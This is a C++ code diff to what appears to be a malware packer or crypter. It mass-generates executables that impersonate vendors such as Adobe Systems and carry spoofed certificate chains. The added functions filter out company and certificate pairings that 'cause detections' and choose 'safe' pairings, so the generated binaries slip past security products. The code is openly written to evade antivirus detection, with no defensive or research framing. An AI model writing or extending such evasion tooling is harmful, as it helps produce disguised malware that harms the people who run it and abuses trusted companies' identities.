@@ -1127,6 +1127,49 @@ public:
             return false;
         }
     }
+    
+    // NEW: Compatibility check for company/certificate combinations
+    bool isCompatibleCombination(int companyIndex, int certIndex) {
+        const auto& company = companyProfiles[companyIndex % companyProfiles.size()];
+        const auto& cert = certificateChains[certIndex % certificateChains.size()];
+        
+        // Adobe Systems problematic combinations
+        if (company.name == "Adobe Systems Incorporated") {
+            if (cert.issuer == "VeriSign Class 3 Public Primary CA" || 
+                cert.issuer == "Thawte Timestamping CA") {
+                return false; // These combinations cause detections
+            }
+        }
+        
+        // Add more problematic combinations as discovered
+        // Future: Add other company+cert combinations that don't work
+        
+        return true; // Default: combination is safe
+    }
+    
+    // NEW: Get a safe random certificate index for a company
+    int getSafeRandomCertIndex(int companyIndex) {
+        int maxAttempts = 50; // Prevent infinite loop
+        int attempts = 0;
+        
+        while (attempts < maxAttempts) {
+            int certIndex = randomEngine.generateRandomDWORD() % certificateChains.size();
+            if (isCompatibleCombination(companyIndex, certIndex)) {
+                return certIndex;
+            }
+            attempts++;
+        }
+        
+        // Fallback: return a known safe certificate
+        // Find DigiCert (known to work with Adobe) or first available
+        for (size_t i = 0; i < certificateChains.size(); ++i) {
+            if (isCompatibleCombination(companyIndex, static_cast<int>(i))) {
+                return static_cast<int>(i);
+            }
+        }
+        
+        return 0; // Last resort fallback
+    }
 };
 
 class EmbeddedCompiler {
@@ -1317,7 +1360,7 @@ DWORD WINAPI massGenerationThread(LPVOID lpParam) {
     for (int i = 0; i < totalCount && g_massGenerationActive; ++i) {
         // Randomize company, cert, and architecture for each generation
         int companyIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCompanyProfiles().size();
-        int certIndex = g_packer.randomEngine.generateRandomDWORD() % g_packer.getCertificateChains().size();
+        int certIndex = g_packer.getSafeRandomCertIndex(companyIndex); // Use safe certificate selection
         int archIndex = g_packer.randomEngine.generateRandomDWORD() % 3; // x86, x64, AnyCPU
         
         auto architectures = g_packer.getArchitectures();
